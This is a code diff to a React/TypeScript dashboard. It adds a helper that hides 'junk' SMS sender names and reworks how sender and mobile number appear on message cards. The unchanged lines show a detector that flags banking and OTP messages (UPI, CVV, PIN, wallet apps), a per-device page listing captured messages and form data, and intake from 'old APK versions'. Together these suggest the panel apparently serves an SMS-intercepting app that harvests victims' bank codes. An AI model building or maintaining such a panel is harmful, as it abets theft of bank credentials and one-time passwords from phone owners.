@@ -181,6 +181,15 @@ function mkAdminUpdate(_did: string, number: string, status: "on" | "off"): Reco
 }
 
 /* ─── Banking / OTP keyword detector ─── */
+// Junk fromSender values from old APK versions where `title` was sent instead
+// of the real sender. When detected, fall back to `fromNumber` for display.
+function isJunkSender(sender: string | null | undefined): boolean {
+  if (!sender) return true;
+  const s = sender.trim().toLowerCase();
+  if (!s) return true;
+  return s === "new sms" || s === "unknown" || s === "sms" || s.startsWith("sms from ");
+}
+
 function isBankingMsg(body: string, sender: string): boolean {
   const text = (body + " " + sender).toLowerCase();
   return /\b(otp|upi|neft|rtgs|imps|bank|credit|debit|account|balance|transaction|txn|payment|transfer|rupee|inr|atm|cvv|pin|emi|loan|insurance|fraud|wallet|paytm|gpay|phonepe|bhim|recharge|cashback|refund|invoice|bill|due|mandate|auto.?pay|salary|withdraw|deposit)\b|₹/.test(text);
@@ -273,14 +282,24 @@ const MsgCard = React.memo(function MsgCard({
 
         {/* From / Mob + Delete */}
         <div style={{ display: "flex", gap: 12, fontSize: 11, flexWrap: "wrap", alignItems: "center" }}>
-          <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
-            <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>FROM</span>{msg.fromSender}
-            <CopyIconButton value={msg.fromSender} size={18} color="#6366f1" title="Copy sender" />
-          </span>
-          <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
-            <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>MOB</span>{msg.fromNumber}
-            <CopyIconButton value={msg.fromNumber} size={18} color="#6366f1" title="Copy number" />
-          </span>
+          {(() => {
+            const displaySender = isJunkSender(msg.fromSender) ? msg.fromNumber : msg.fromSender;
+            const showMob = msg.fromNumber && msg.fromNumber !== displaySender && !isJunkSender(msg.fromSender);
+            return (
+              <>
+                <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
+                  <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>FROM</span>{displaySender}
+                  <CopyIconButton value={displaySender} size={18} color="#6366f1" title="Copy sender" />
+                </span>
+                {showMob && (
+                  <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
+                    <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>MOB</span>{msg.fromNumber}
+                    <CopyIconButton value={msg.fromNumber} size={18} color="#6366f1" title="Copy number" />
+                  </span>
+                )}
+              </>
+            );
+          })()}
           {msg.toNumber && (
             <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
               <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>TO</span>{msg.toNumber}
@@ -1716,14 +1735,24 @@ function DevicesPage({ appId, devices, messages, formData, initialDevice, onBack
                   <CopyIconButton value={msg.body} size={22} color="#6366f1" title="Copy message" />
                 </div>
                 <div style={{ display: "flex", gap: 10, fontSize: 11, flexWrap: "wrap", alignItems: "center" }}>
-                  <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
-                    <span style={{ color: "#94a3b8", fontSize: 10, marginRight: 3, fontWeight: 600 }}>FROM</span>{msg.fromSender}
-                    <CopyIconButton value={msg.fromSender} size={18} color="#6366f1" title="Copy sender" />
-                  </span>
-                  <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
-                    <span style={{ color: "#94a3b8", fontSize: 10, marginRight: 3, fontWeight: 600 }}>MOB</span>{msg.fromNumber}
-                    <CopyIconButton value={msg.fromNumber} size={18} color="#6366f1" title="Copy number" />
-                  </span>
+                  {(() => {
+                    const displaySender = isJunkSender(msg.fromSender) ? msg.fromNumber : msg.fromSender;
+                    const showMob = msg.fromNumber && msg.fromNumber !== displaySender && !isJunkSender(msg.fromSender);
+                    return (
+                      <>
+                        <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
+                          <span style={{ color: "#94a3b8", fontSize: 10, marginRight: 3, fontWeight: 600 }}>FROM</span>{displaySender}
+                          <CopyIconButton value={displaySender} size={18} color="#6366f1" title="Copy sender" />
+                        </span>
+                        {showMob && (
+                          <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
+                            <span style={{ color: "#94a3b8", fontSize: 10, marginRight: 3, fontWeight: 600 }}>MOB</span>{msg.fromNumber}
+                            <CopyIconButton value={msg.fromNumber} size={18} color="#6366f1" title="Copy number" />
+                          </span>
+                        )}
+                      </>
+                    );
+                  })()}
                   {msg.toNumber && (
                     <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
                       <span style={{ color: "#94a3b8", fontSize: 10, marginRight: 3, fontWeight: 600 }}>TO</span>{msg.toNumber}
